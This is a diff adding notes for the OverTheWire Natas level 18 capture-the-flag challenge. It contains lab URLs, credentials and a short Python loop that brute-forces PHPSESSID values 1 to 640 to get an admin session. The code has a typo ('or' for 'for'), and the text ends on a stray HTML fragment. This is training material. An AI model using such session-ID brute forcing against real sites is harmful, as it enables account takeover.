@@ -308,3 +308,17 @@ lvl 18 --> lvl 19
 http://natas18.natas.labs.overthewire.org/
 natas18
 xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
+// The point of this level is to play around with PHPSESSID. We have to loop through 1 to 640 to find 
+// the one giving us admin access
+// Python loop
+or session_id in range(1, 641):
+    response = session.get(url, cookies = {"PHPSESSID": str(session_id)}, auth = (username, password))
+    content = response.text
+
+    if( "You are an admin" in content):
+        print('You got it', session_id)
+        print(content)
+    else:
+        print('Still trying', session_id)
+//
+4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</pre><div
